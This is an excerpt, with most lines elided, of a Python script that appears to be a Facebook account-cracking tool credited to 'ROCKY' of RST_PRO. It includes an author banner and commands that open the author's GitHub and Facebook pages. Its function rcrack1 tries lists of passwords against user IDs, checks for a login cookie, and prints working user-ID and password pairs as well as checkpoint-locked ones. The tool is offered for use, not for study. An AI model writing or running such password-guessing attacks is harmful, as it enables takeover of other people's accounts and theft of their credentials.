...
os.system('xdg-open https://github.com/RS-ROCKY')
...
\033[1;94m       [+]        CREATED BY   :  ROCKY               \033[1;94m[+]

\033[1;94m       [+]        ON GITHUB    :  RS-ROCKY               \033[1;94m[+]

\033[1;94m       [+]        TEAM         :  RST_PRO        \033[1;94m[+]
...
class Main:
    ...
    def __init__(self):
        ...
        os.system('xdg-open https://facebook.com/groups/795063638147934/')
        ...
        if Alif in ["2","02"]:
            ...
            os.system('xdg-open https://www.facebook.com/profile.php?id=100082010261051')
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        ...
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mRST-ROCKY\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            ...
            if 'c_user' in log_cookies:
                ...
                print(f"\033[38;5;46m[RST-ROCKY-OK💉] {uid} | {ps}")
                ...
                print(f"\x1b[38;5;196m[RST-ROCKY-CP💔] {uid}|{ps}")
        ...
        sys.stdout.write(f'\r\033[m[RST-ROCKY👑] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
